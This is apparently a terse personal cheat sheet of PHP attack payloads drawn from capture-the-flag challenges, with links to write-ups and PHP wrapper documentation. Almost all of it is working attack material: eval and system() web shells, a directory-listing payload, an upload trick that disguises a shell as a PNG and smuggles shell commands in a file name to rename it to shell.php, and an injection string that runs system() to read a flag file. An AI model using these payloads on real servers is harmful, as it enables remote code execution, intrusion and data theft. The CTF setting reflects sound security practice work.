# php

- https://github.com/ctfs/write-ups-2015/tree/master/codegate-ctf-2015/web/owlur
- https://www.arneswinnen.net/2013/11/hack-lu-2013-ctf-wannabe-writeup-part-one-web-exploitation/
- http://php.net/manual/en/wrappers.php

```html
<script language=PHP>eval($_GET['q']);</script>
<?php print_r(scandir('/')) ?>
```

```html
<?php echo system($_GET['s']); ?>
```
    > uploaded as shell.png, then uploaded another file: ´cd uploads;cd 6a9btoq20khkn8ln5lfhuo6v62;cp 65-shell.png shell.php´.png

```
flag','..')+or+system('cat+templates/flag.php');//
```
